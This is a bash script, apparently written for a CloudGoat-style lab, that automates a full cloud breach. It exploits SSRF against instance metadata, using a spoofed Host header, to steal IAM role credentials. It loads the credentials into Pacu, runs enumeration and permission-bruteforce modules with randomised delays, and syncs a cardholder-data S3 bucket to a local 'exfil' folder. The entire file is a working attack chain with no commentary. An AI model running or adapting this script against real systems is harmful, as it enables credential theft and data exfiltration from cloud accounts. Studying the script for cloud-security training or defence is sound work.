echo 'ssrf attack'
sts_session=$(curl -s http://44.203.232.237/latest/meta-data/iam/security-credentials/Banking-WAF-Role -H 'Host:169.254.169.254')
sleep 5
sts_session=$(curl -s http://44.203.232.237/latest/meta-data/iam/security-credentials/Banking-WAF-Role -H 'Host:169.254.169.254')
sleep 5
echo 'ssrf attack complete'

export AWS_ACCESS_KEY_ID=$(jq -r '.AccessKeyId' <<< ${sts_session})
export AWS_SESSION_TOKEN=$(jq -r '.Token' <<< ${sts_session})
export AWS_SECRET_ACCESS_KEY=$(jq -r '.SecretAccessKey' <<< ${sts_session})
export AWS_REGION=us-east-1
sleep 5
echo 'set aws environment variables'


echo 'set keys in pacu'
../pacu/cli.py --session cloud_breach_s3 --set-keys cloud_breach_s3,$AWS_ACCESS_KEY_ID,$AWS_SECRET_ACCESS_KEY,$AWS_SESSION_TOKEN
../pacu/cli.py --session cloud_breach_s3 --whoami

timer=${RANDOM:0:3}
echo $timer
sleep $timer
echo 'execute aws__enum_account'
../pacu/cli.py --session cloud_breach_s3 --exec --module-name aws__enum_account

timer=${RANDOM:0:3}
echo $timer
sleep $timer
echo 'execute iam__enum_permissions'
../pacu/cli.py --session cloud_breach_s3 --exec --module-name iam__enum_permissions

timer=${RANDOM:0:3}
echo $timer
sleep $timer
echo 'execute iam__enum_users_roles_policies_groups'
../pacu/cli.py --session cloud_breach_s3 --exec --module-name iam__enum_users_roles_policies_groups

timer=${RANDOM:0:3}
echo $timer
sleep $timer
echo 'execute iam__bruteforce_permissions'
../pacu/cli.py --session cloud_breach_s3 --exec --module-name iam__bruteforce_permissions


timer=${RANDOM:0:3}
echo $timer
sleep $timer
echo 'execute s3 discovery'
aws s3 ls

timer=${RANDOM:0:3}
echo $timer
sleep $timer
echo 'execute s3 exfil'
aws s3 sync s3://cg-cardholder-data-bucket-cloud-breach-s3-cgidq0wzijvq7l ./cloud_breach_s3_exfil

#DONE!